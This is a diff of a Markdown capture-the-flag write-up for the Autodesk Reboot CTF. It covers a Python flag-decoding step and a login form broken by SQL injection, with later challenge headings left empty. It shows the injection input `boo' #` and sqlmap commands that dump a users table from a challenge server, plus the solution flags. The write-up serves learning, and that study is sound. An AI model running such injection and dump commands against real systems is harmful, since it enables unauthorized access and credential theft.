@@ -1,11 +1,12 @@
-## Autodesk Reboot CTF 2017
+## Autodesk Reboot CTF 2018
 
 This CTF is more about resverse-engineering which i'm not good at. But these challenges are interesting.
 
 # All Me to Introduce Myself
 
 The challenge is as easy as ... compiling the python code to get the flag:
-`python3 -c "for i in [102, 108, 97, 103, 123, 119, 101, 108, 99, 111, 109, 101, 95, 112, 97, 114, 116, 105, 99, 105, 112, 97, 110, 116, 115, 33, 125]: print(chr(i), end='')"`
+
+> python3 -c "for i in [102, 108, 97, 103, 123, 119, 101, 108, 99, 111, 109, 101, 95, 112, 97, 114, 116, 105, 99, 105, 112, 97, 110, 116, 115, 33, 125]: print(chr(i), end='')"
 
 ![](img/1.png)
 
@@ -37,17 +38,31 @@ boo boo
 
 We are provided with an URL: `http://68.183.148.46:8001`
 
-**Recon:** Upon visiting website, I see there is a simple signin form. I check with simple query and could signin. But then there is a message saying that the flag is the password. I need to do blind injection anyway and sqlmap is a useful tool for this occasion.
+**Recon:** Upon visiting website, I see there is a simple signin form. I check with simple query `boo' #` for username and could sign in. But then there is a message saying that the flag is the password. I need to do blind injection anyway and sqlmap is a useful tool for this occasion.
 
 First, I run sqlmap with simple command:
-`sqlmap -u "http://68.183.148.46:8001/login.php" --data "username=u&password=p" --method POST --dbs`
+> sqlmap -u "http://68.183.148.46:8001/login.php" --data "username=u&password=p" --method POST --dbs
 
 We got some useful information:
 
 ![](img/3-injection.png)
 
-Here is the final query to get the flag:
-`sqlmap -u "http://68.183.148.46:8001/login.php" --data "username=u&password=p"  --method POST -D webapp -T users --dump`
+You can play around with sqlmap to get all the databases, tables, etc. It takes a while so here is the final query to get the flag:
+> sqlmap -u "http://68.183.148.46:8001/login.php" --data "username=u&password=p"  --method POST -D webapp -T users --dump
 
 ANd here is our flag:
 > flag{h4ck3r5_cr4ck3r5_4nd_5ql_1nj3c710n}
+
+# Alchemy
+
+I have no idea about Erl Elixir
+
+# Notesy
+
+# Pickleshop
+
+# apartment
+
+# xml_is_hard
+
+# 64 caneries
